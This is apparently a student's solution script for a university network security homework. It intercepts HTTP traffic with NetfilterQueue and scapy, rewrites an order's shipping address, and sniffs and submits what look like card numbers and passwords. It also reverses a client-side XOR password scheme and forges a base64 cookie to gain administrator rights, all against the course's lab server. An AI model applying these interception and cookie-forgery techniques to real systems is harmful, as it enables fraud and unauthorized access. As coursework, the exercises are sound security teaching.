from netfilterqueue import NetfilterQueue
from scapy.all import *
from scapy.all import IP
import json
import requests
import sys
import base64


'''
################################################################################

This  File  script contains solutions to the
Homework 1 which has 4 exercises.

The names of each function has corresponds to 
the exercise number. E .g

def ex3:
	"This defines function to solve exercise3"


To see the solution to each exercise , from the command
line type:

						OR
		python3 -c 'from  interceptor import  exercise3 ;  exercise3()'


where interceptor is the name of the file (ie this file) and exercise3 is the 
function that solves the corresponsing exercise of interest- in this case exercise 3.
######################################################################################

'''



def exercise3_call_back_function(pkt):
	'''
	This function is used by the exercise 3 function below
	to get the ip packets from raw payload.
	The exercise3 function recursively runs this function to solve 
	exercise 3	

	Input : the intercepted raw payload
	Output: The token and staus code

	'''
	url = 'http://com402.epfl.ch/hw1/ex3/shipping' # This  is the url which we will use with request

	pkt.accept() # accept the  packet (dont reject ot drop)
	payload = pkt.get_payload() # get the payload and store in variable payload
	ip = IP(payload) # create an IP packet from payload


	if ip.haslayer(TCP) == True and ip[TCP].dport == 80:
			assert ip[TCP].dport == 80
			if ip.haslayer(Raw):
				#print (ip[Raw])
				http = ip[Raw].load.decode();
				if "shipping" in http:
					print("yes");

					data_ = "{" + http.split("{",1)[1] # split the payload anf extrat json.
					# This implies in the payload only the response starting with {  is needed.
					# This will correspond to where the json file starts.
					# A "{" was added in the expression because when we split from "{" in the payload,
					# The bracelet "{"" is excluded. But we need it to have a valid json format.
					# Hence, the need to add it  back  explicitly as "{" in the expression above
					data = json.loads(data_) # load the new json file

					data['shipping_address'] = 'lukman.olagoke@epfl.ch' # Here we replace the shipping address

					header = {"User-Agent":"Dumb Generator","Host":"com402.epfl.ch","Content-Type":"application/json","Content-Length":"91"}
					# It is possible to extract the header too from payload but since the header from payload has no
					# " "  double column ,  which is required for the request header format, this might amount to a for-loop computation
					# that might affect efficciency. The good thing is the header is not long so explicit declarationas above works well
					# to just construct a n
					#print (data) # Uncomment this to view data

					# Below we use the requests library to generate new packet, with the new json
					r = requests.post(url, data=json.dumps(data),headers=header)
					# The new json is response is provided as response below
					print ("The token response: ")
					print (r.text)
					# We verify the status code is 200 = okay
					print("\n The status code: ")
					print (r.status_code)

def exercise3():

	'''
	This function recursively calls the exercise3_call_back_function.
	It makes ise of the NetFilterQueue.

	'''

	nfqueue = NetfilterQueue() # create instance of NFQUEUE-- NetfilterQueue provides access to packets matched by an iptables rule in Linux
	nfqueue.bind(0, exercise3_call_back_function, 100) # bind nfqueue to function exercise3_call_back_function. This enables raw packets to be collected
													  # and processed by the exercise3_call_back_function

	try:
		nfqueue.run() # run nfqueue in try catch block

	except KeyboardInterrupt:
		sys.exit(0)


	nfqueue.unbind()  # unbind nfqueue
	sys.exit(0)

def exercise4_call_back_function(pkt):

	'''
	This function is used by the exercise 4 function below
	to get the ip packets from raw payload.
	The exercise4 function recursively runs this function to solve 
	exercise 4

	As part of the analysis the output of the print is piped to
	a text file and the sensitive data is carefully spotted.



	Input : the intercepted raw payload
	Output: The token and staus code
	'''
	
	url = 'http://com402.epfl.ch/hw1/ex4/sensitive' # This  is the url which we will use with request
	
	pkt.accept()  # accept raw packet
	payload = pkt.get_payload()  # get the payload of raw packet
	#print(k)
	ip = IP(payload) # create an ip packet
	


	if ip.haslayer(TCP) == True and ip[TCP].dport == 80:
			assert ip[TCP].dport == 80;
			if ip.haslayer(Raw):
				#print (ip[Raw])
				http = ip[Raw].load.decode();
				#print(http.lstrip(' '))  # uncomment this to see the output. One possibility is to pipe the output to text file  when this is uncommented
				# this enables carful reading of sensitive information

	# we create the new json file for the payload/sensitive data and header
	data = {"student_email":"lukman.olagoke@epfl.ch","secrets": ["5370/2586/7638/8964","0470.5684.7704.8295","7968/7126/0501/8790","W;PGR5E@SU1X>","=X5AN>?YN419PA"]}

	header = {"User-Agent":"Dumb Generator","Host":"com402.epfl.ch","Content-Type":"application/json","Content-Length":"452"}

	# post a request using payload and headr
	try :
		r = requests.post(url, data=json.dumps(data),headers=header)
		# The new response is provided as response below
		print ("The token response: ")
		print (r.text)
	# We verify the status code is 200 = okay
		print("\n The status code: ")
		print (r.status_code)

		print ("\n")
	except KeyboardInterrupt:
		   pass

def exercise4():

	'''
	This function recursively calls the exercise4_call_back_function.
	It makes ise of the NetFilterQueue.


	'''

	nsfqueue = NetfilterQueue() # create instance of NFQUEUE-- NetfilterQueue provides access to packets matched by an iptables rule in Linux
	nsfqueue.bind(0, exercise4_call_back_function, 100) # bind nfqueue to function exercise3_call_back_function. This enables raw packets to be collected
													  # and processed by the exercise3_call_back_function

	try:
		nsfqueue.run() # run nfqueue in try catch block

	except KeyboardInterrupt:
		   sys.exit(0)
		#print('')   # exception
	nsfqueue.unbind()  # unbind nfqueue
	sys.exit(0)








################################ EXERCISE ONE ######################################################################
'''
Inspecting the web page  http://com402.epfl.ch/hw1/ex1, we observed that encryption was done on the client side.

In particular the dunction below does the encryption:



function superencryption(msg,key) {
                if (key.length < msg.length) {
                    var diff = msg.length - key.length;
                    key += key.substring(0,diff);
                }

                var amsg = msg.split("").map(ascii);
                var akey = key.substring(0,msg.length).split("").map(ascii);
                return btoa(amsg.map(function(v,i) {
                    return v ^ akey[i];
                }).map(toChar).join(""));
            }



More strangely, msg = my email address = lukman.olagoke@epfl.ch and  key =secureOneTimePad =Never send a human to do a machine's job".
There we can run the function superencryption(msg,key)  from the web console as below:

>>>>>>>  superencryption("lukman.olagoke@epfl.ch","Never send a human to do a machine's job")
This gives : 
>>>>>>>  "IhAdCBNOXQoCBUcOSw01CBEITFoMSA=="
Which is the password to use on the webpage to enable login and get token
>>>>>>



'''





def ex2_cookies():
    cookie = 'bHVrbWFuLm9sYWdva2VAZXBmbC5jaCwxNTIwNDM3OTk2LGNvbTQwMixodzEsZXgxLHVzZXI='
    decoded = base64.b64decode(cookie)
    print("\nMy cookie is  " + cookie)

    print("\nMy decoded cookie is: \n")
    print(decoded)
    
    print ("\nChange user to administrator in the cookie decode and encode again...");

    #    cookie decoded is b'lukman.olagoke@epfl.ch,1520437996,com402,hw1,ex1,user'
    # change user to administrator. This becomes new cookie

    newCookie = b'lukman.olagoke@epfl.ch,1520437996,com402,hw1,ex1,administrator'
    print ("\nNew Cookie is:" + str(newCookie))


    # Encode the new cookie and replace cookie with new cookie on browser
    print ("\nEncode new Cookie to get : ");
    encoded = base64.b64encode(newCookie)

    print(encoded)

    # encoded = "bHVrbWFuLm9sYWdva2VAZXBmbC5jaCwxNTIwNDM5MTAzLGNvbTQwMixodzEsZXgxLGFkbWluaXN0cmF0b3I="

    # use the new encoded cookie   in the browser 





